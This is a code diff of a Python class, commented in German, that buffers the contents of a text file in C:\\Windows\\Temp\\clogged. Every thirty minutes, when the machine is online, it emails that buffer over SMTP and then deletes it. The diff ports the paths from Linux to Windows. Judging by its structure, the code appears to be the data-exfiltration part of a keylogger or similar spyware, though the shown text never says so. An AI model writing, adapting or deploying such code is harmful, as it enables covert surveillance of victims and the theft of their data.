@@ -28,7 +28,7 @@ class email_sender_class:
         # Internet checker
         def datei_stockt_stagged(): #Datei verschieben
                 with open(textfile,"r")as old_file:        # von datei in neue datei schreiben
-                        with open("/tmp/clogged","a")as new_file:       # PFAD ANPASSEN!
+                        with open("C:\\Windows\\Temp\\clogged","a")as new_file:       # PFAD ANPASSEN!
                                 for element in old_file:
                                         new_file.write(element)
                 old_file.close()
@@ -39,8 +39,8 @@ class email_sender_class:
                         time.sleep(1800) #standart ist 1800 = 30 min
                         if connection_on==1:    # jede 30 minuten prüfen ob eine verbindung besteht
                                 
-                                with open("/tmp/clogged","r")as read_file:              # PFAD ANPASSEN!
-                                        pfad_zu_senden = "/tmp/clogged"                 # PFAD ANPASSEN!
+                                with open("C:\\Windows\\Temp\\clogged","r")as read_file:              # PFAD ANPASSEN!
+                                        pfad_zu_senden = "C:\\Windows\\Temp\\clogged"                 # PFAD ANPASSEN!
                                         stocked = EmailMessage()
                                         stocked.set_content(read_file.read())
                                         stocked['Subject'] = f'The contents of {pfad_zu_senden}'
@@ -52,7 +52,7 @@ class email_sender_class:
                                         s2.send_message(stocked)     
                                         s2.quit()
                                         time.sleep(60) # 1 minute
-                                        os.remove("/tmp/clogged")               # PFAD ANPASSEN!
+                                        os.remove("C:\\Windows\\Temp\\clogged")               # PFAD ANPASSEN!
                                         time.sleep(5)
                                         break
         
